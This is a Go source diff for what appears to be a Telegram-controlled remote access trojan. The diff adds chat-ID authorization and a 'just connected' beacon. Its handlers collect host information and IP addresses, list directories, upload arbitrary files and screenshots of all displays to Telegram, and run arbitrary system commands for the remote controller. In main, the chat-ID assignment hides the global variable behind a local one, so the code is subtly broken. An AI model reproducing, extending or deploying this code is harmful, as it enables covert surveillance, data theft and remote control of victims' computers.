@@ -4,11 +4,11 @@ import (
 	"fmt"
 	"image/png"
 	"log"
-	"net/http"
 	"os"
 	"os/user"
 	"path/filepath"
 	"runtime"
+	"strconv"
 	"strings"
 	"telegorat/helpers"
 	"time"
@@ -20,20 +20,33 @@ import (
 	"github.com/kbinani/screenshot"
 )
 
+var chatId int64
+
 func main() {
 
 	token := os.Getenv("BOT_TOKEN")
 
+	//Get authorized controller's chatId
+	chatId, err := strconv.ParseInt(os.Getenv("CHAT_ID"), 10, 64)
+	if err != nil {
+		panic("Failed to convert chatId to int64: " + err.Error())
+	}
+
 	//Create new bot using the bot API token
 	b, err := gotgbot.NewBot(token, &gotgbot.BotOpts{
-		Client: http.Client{},
-		DefaultRequestOpts: &gotgbot.RequestOpts{
+		RequestOpts: &gotgbot.RequestOpts{
 			Timeout: gotgbot.DefaultTimeout * 3,
 			APIURL:  gotgbot.DefaultAPIURL,
 		},
 	})
 	if err != nil {
 		panic("Failed to create new bot: " + err.Error())
+	}
+
+	//Send message when initiating connection
+	_, err = b.SendMessage(chatId, "just connected", &gotgbot.SendMessageOpts{})
+	if err != nil {
+		panic("Failed to send initiate message: " + err.Error())
 	}
 
 	//Create updater and dispatcher
@@ -47,13 +60,14 @@ func main() {
 			MaxRoutines: ext.DefaultMaxRoutines,
 		}),
 	})
+
 	dispatcher := updater.Dispatcher
 
 	//List available commands
 	dispatcher.AddHandler(handlers.NewCommand("help", getHelp))
 	//Get the bot ID
 	dispatcher.AddHandler(handlers.NewCommand("ping", pingPong))
-	// Get basic host info
+	//Get basic host info
 	dispatcher.AddHandler(handlers.NewCommand("systeminfo", systemInfo))
 	//Get public IP address
 	dispatcher.AddHandler(handlers.NewCommand("ip", getIPs))
@@ -63,13 +77,13 @@ func main() {
 	dispatcher.AddHandler(handlers.NewCommand("file", readFile))
 	//Take screenshot
 	dispatcher.AddHandler(handlers.NewCommand("screenshot", takeScreenshot))
-	//command
+	//Execute system command
 	dispatcher.AddHandler(handlers.NewCommand("command", executeCommand))
 
 	//Start polling for updates
 	err = updater.StartPolling(b, &ext.PollingOpts{
 		DropPendingUpdates: true,
-		GetUpdatesOpts: gotgbot.GetUpdatesOpts{
+		GetUpdatesOpts: &gotgbot.GetUpdatesOpts{
 			Timeout: 9,
 			RequestOpts: &gotgbot.RequestOpts{
 				Timeout: time.Second * 10,
@@ -86,15 +100,28 @@ func main() {
 
 }
 
+func auth(authorizedChatId int64, effectiveChatId int64) bool {
+
+	//Check if the message received is sent from the authorized controller
+	if authorizedChatId == effectiveChatId {
+		return true
+	} else {
+		return false
+	}
+}
+
 func getHelp(b *gotgbot.Bot, ctx *ext.Context) error {
 
+	//Authentication
+	if !(auth(chatId, ctx.EffectiveChat.Id)) {
+		return fmt.Errorf("Unauthorized user: %s (%s %s)", ctx.EffectiveChat.Username, ctx.EffectiveChat.FirstName, ctx.EffectiveChat.LastName)
+	}
+
 	//Array contains the available commands
-	commands := []string{"/ping", "/systeminfo", "/ip", "/list <dir>", "/file <file>", "/screenshot", "/command"}
+	commands := []string{"/ping", "/systeminfo", "/ip", "/list <dir>", "/file <file>", "/screenshot", "/command <system_command>"}
 
 	//Reply with list of available commands
-	_, err := b.SendMessage(ctx.EffectiveChat.Id, strings.Join([]string(commands), "\n"), &gotgbot.SendMessageOpts{
-		//ReplyToMessageId: ctx.EffectiveMessage.MessageId,
-	})
+	_, err := b.SendMessage(chatId, strings.Join([]string(commands), "\n"), &gotgbot.SendMessageOpts{})
 	if err != nil {
 		return fmt.Errorf("Failed to send message: %w", err)
 	}
@@ -105,9 +132,7 @@ func getHelp(b *gotgbot.Bot, ctx *ext.Context) error {
 func pingPong(b *gotgbot.Bot, ctx *ext.Context) error {
 
 	//Reply to ping command with pong
-	_, err := b.SendMessage(ctx.EffectiveChat.Id, "pong", &gotgbot.SendMessageOpts{
-		//ReplyToMessageId: ctx.EffectiveMessage.MessageId
-	})
+	_, err := b.SendMessage(ctx.EffectiveChat.Id, "pong", &gotgbot.SendMessageOpts{})
 	if err != nil {
 		return fmt.Errorf("Failed to send start message: %w", err)
 	}
@@ -115,6 +140,11 @@ func pingPong(b *gotgbot.Bot, ctx *ext.Context) error {
 }
 
 func systemInfo(b *gotgbot.Bot, ctx *ext.Context) error {
+
+	//Authentication
+	if !(auth(chatId, ctx.EffectiveChat.Id)) {
+		return fmt.Errorf("Unauthorized user: %s (%s %s)", ctx.EffectiveChat.Username, ctx.EffectiveChat.FirstName, ctx.EffectiveChat.LastName)
+	}
 
 	user, err := user.Current()
 	if err != nil {
@@ -131,7 +161,7 @@ func systemInfo(b *gotgbot.Bot, ctx *ext.Context) error {
 	architecture := runtime.GOARCH
 
 	//Reply to ping command with pong
-	_, err = b.SendMessage(ctx.EffectiveChat.Id, fmt.Sprintf("Username: %s\nHostname: %s\nOS : %s\nArch: %s", user.Username, hostname, operatingSystem, architecture), &gotgbot.SendMessageOpts{
+	_, err = b.SendMessage(chatId, fmt.Sprintf("Username: %s\nHostname: %s\nOS : %s\nArch: %s", user.Username, hostname, operatingSystem, architecture), &gotgbot.SendMessageOpts{
 		ParseMode: "html",
 		//ReplyToMessageId: ctx.EffectiveMessage.MessageId
 	})
@@ -143,6 +173,11 @@ func systemInfo(b *gotgbot.Bot, ctx *ext.Context) error {
 
 func listFiles(b *gotgbot.Bot, ctx *ext.Context) error {
 
+	//Authentication
+	if !(auth(chatId, ctx.EffectiveChat.Id)) {
+		return fmt.Errorf("Unauthorized user: %s (%s %s)", ctx.EffectiveChat.Username, ctx.EffectiveChat.FirstName, ctx.EffectiveChat.LastName)
+	}
+
 	//Read the effective message text (e.g. /list C:\Users\)
 	messageText := ctx.EffectiveMessage.Text
 
@@ -150,9 +185,8 @@ func listFiles(b *gotgbot.Bot, ctx *ext.Context) error {
 	dirName, err := helpers.ExtractArgument(messageText)
 	if err != nil {
 		//If no argument provided send intructions
-		_, err2 := b.SendMessage(ctx.EffectiveChat.Id, "Usage: <b>/list</b> &lt;dir_path&gt;", &gotgbot.SendMessageOpts{
+		_, err2 := b.SendMessage(chatId, "Usage: <b>/list</b> &lt;dir_path&gt;", &gotgbot.SendMessageOpts{
 			ParseMode: "html",
-			//ReplyToMessageId: ctx.EffectiveMessage.MessageId,
 		})
 		if err2 != nil {
 			return fmt.Errorf("Failed to send instructions: %w", err2)
@@ -176,9 +210,7 @@ func listFiles(b *gotgbot.Bot, ctx *ext.Context) error {
 	}
 
 	//If no argument provided send intructions
-	_, err = b.SendMessage(ctx.EffectiveChat.Id, result.String(), &gotgbot.SendMessageOpts{
-		//ReplyToMessageId: ctx.EffectiveMessage.MessageId,
-	})
+	_, err = b.SendMessage(chatId, result.String(), &gotgbot.SendMessageOpts{})
 	if err != nil {
 		return fmt.Errorf("Failed to send message: %w", err)
 	}
@@ -188,6 +220,11 @@ func listFiles(b *gotgbot.Bot, ctx *ext.Context) error {
 
 func readFile(b *gotgbot.Bot, ctx *ext.Context) error {
 
+	//Authentication
+	if !(auth(chatId, ctx.EffectiveChat.Id)) {
+		return fmt.Errorf("Unauthorized user: %s (%s %s)", ctx.EffectiveChat.Username, ctx.EffectiveChat.FirstName, ctx.EffectiveChat.LastName)
+	}
+
 	//Read the effective message text (e.g. /file C:\test.txt)
 	messageText := ctx.EffectiveMessage.Text
 
@@ -195,9 +232,8 @@ func readFile(b *gotgbot.Bot, ctx *ext.Context) error {
 	fileName, err := helpers.ExtractArgument(messageText)
 	if err != nil {
 		//If no argument provided send intructions
-		_, err2 := b.SendMessage(ctx.EffectiveChat.Id, "Usage: <b>/file</b> &lt;filen_path&gt;", &gotgbot.SendMessageOpts{
+		_, err2 := b.SendMessage(chatId, "Usage: <b>/file</b> &lt;filen_path&gt;", &gotgbot.SendMessageOpts{
 			ParseMode: "html",
-			//ReplyToMessageId: ctx.EffectiveMessage.MessageId,
 		})
 		if err2 != nil {
 			return fmt.Errorf("Failed to send instructions: %w", err2)
@@ -212,9 +248,8 @@ func readFile(b *gotgbot.Bot, ctx *ext.Context) error {
 	}
 
 	//Send file to telegram server
-	_, err = b.SendDocument(ctx.EffectiveChat.Id, file, &gotgbot.SendDocumentOpts{
+	_, err = b.SendDocument(chatId, file, &gotgbot.SendDocumentOpts{
 		Caption: fileName,
-		//ReplyToMessageId: ctx.EffectiveMessage.MessageId,
 	})
 	if err != nil {
 		return fmt.Errorf("Failed to send file: %w", err)
@@ -224,6 +259,11 @@ func readFile(b *gotgbot.Bot, ctx *ext.Context) error {
 }
 
 func takeScreenshot(b *gotgbot.Bot, ctx *ext.Context) error {
+
+	//Authentication
+	if !(auth(chatId, ctx.EffectiveChat.Id)) {
+		return fmt.Errorf("Unauthorized user: %s (%s %s)", ctx.EffectiveChat.Username, ctx.EffectiveChat.FirstName, ctx.EffectiveChat.LastName)
+	}
 
 	//Number of active displays
 	n := screenshot.NumActiveDisplays()
@@ -261,9 +301,8 @@ func takeScreenshot(b *gotgbot.Bot, ctx *ext.Context) error {
 		}
 
 		//Send image to telegram server
-		_, err = b.SendPhoto(ctx.EffectiveChat.Id, image, &gotgbot.SendPhotoOpts{
+		_, err = b.SendPhoto(chatId, image, &gotgbot.SendPhotoOpts{
 			Caption: time.Now().Format("2006-01-02 15:04:05"),
-			//ReplyToMessageId: ctx.EffectiveMessage.MessageId,
 		})
 		if err != nil {
 			return fmt.Errorf("Failed to send screenshot: %w", err)
@@ -281,6 +320,11 @@ func takeScreenshot(b *gotgbot.Bot, ctx *ext.Context) error {
 
 func getIPs(b *gotgbot.Bot, ctx *ext.Context) error {
 
+	//Authentication
+	if !(auth(chatId, ctx.EffectiveChat.Id)) {
+		return fmt.Errorf("Unauthorized user: %s (%s %s)", ctx.EffectiveChat.Username, ctx.EffectiveChat.FirstName, ctx.EffectiveChat.LastName)
+	}
+
 	//Get public IP
 	publicIP, err := helpers.GetPublicIP()
 	if err != nil {
@@ -294,9 +338,8 @@ func getIPs(b *gotgbot.Bot, ctx *ext.Context) error {
 	}
 
 	//Send IPs to telegram server
-	_, err = b.SendMessage(ctx.EffectiveChat.Id, fmt.Sprintf("Public IP: <b>%s</b>\nLocal IP: <b>%s</b>", publicIP, localIP), &gotgbot.SendMessageOpts{
+	_, err = b.SendMessage(chatId, fmt.Sprintf("Public IP: <b>%s</b>\nLocal IP: <b>%s</b>", publicIP, localIP), &gotgbot.SendMessageOpts{
 		ParseMode: "html",
-		//ReplyToMessageId: ctx.EffectiveMessage.MessageId,
 	})
 	if err != nil {
 		return fmt.Errorf("Failed to send IP addresses: %w", err)
@@ -307,6 +350,11 @@ func getIPs(b *gotgbot.Bot, ctx *ext.Context) error {
 
 func executeCommand(b *gotgbot.Bot, ctx *ext.Context) error {
 
+	//Authentication
+	if !(auth(chatId, ctx.EffectiveChat.Id)) {
+		return fmt.Errorf("Unauthorized user: %s (%s %s)", ctx.EffectiveChat.Username, ctx.EffectiveChat.FirstName, ctx.EffectiveChat.LastName)
+	}
+
 	//Read the effective message text (e.g. /commmand whoami)
 	messageText := ctx.EffectiveMessage.Text
 
@@ -315,9 +363,8 @@ func executeCommand(b *gotgbot.Bot, ctx *ext.Context) error {
 	if err != nil {
 
 		//If no argument provided send intructions
-		_, err = b.SendMessage(ctx.EffectiveChat.Id, "<i>Usage:</i> /command &lt;system_command&gt;", &gotgbot.SendMessageOpts{
+		_, err = b.SendMessage(chatId, "<i>Usage:</i> /command &lt;system_command&gt;", &gotgbot.SendMessageOpts{
 			ParseMode: "html",
-			//ReplyToMessageId: ctx.EffectiveMessage.MessageId,
 		})
 		if err != nil {
 			return fmt.Errorf("Failed to send instructions: %w", err)
@@ -330,7 +377,7 @@ func executeCommand(b *gotgbot.Bot, ctx *ext.Context) error {
 	output, err := helpers.ExecuteSystemCommand(cmd)
 	if err != nil {
 		//If an error occured during the commad execution send it to Telegram server
-		_, err2 := b.SendMessage(ctx.EffectiveChat.Id, err.Error(), &gotgbot.SendMessageOpts{})
+		_, err2 := b.SendMessage(chatId, err.Error(), &gotgbot.SendMessageOpts{})
 		if err2 != nil {
 			return fmt.Errorf("Failed to send command execution error: %w", err2)
 		}
@@ -339,7 +386,7 @@ func executeCommand(b *gotgbot.Bot, ctx *ext.Context) error {
 	}
 
 	//Send the output to Telegram server
-	_, err = b.SendMessage(ctx.EffectiveChat.Id, string(output), &gotgbot.SendMessageOpts{})
+	_, err = b.SendMessage(chatId, string(output), &gotgbot.SendMessageOpts{})
 	if err != nil {
 		return fmt.Errorf("Failed to send command output: %w", err)
 	}
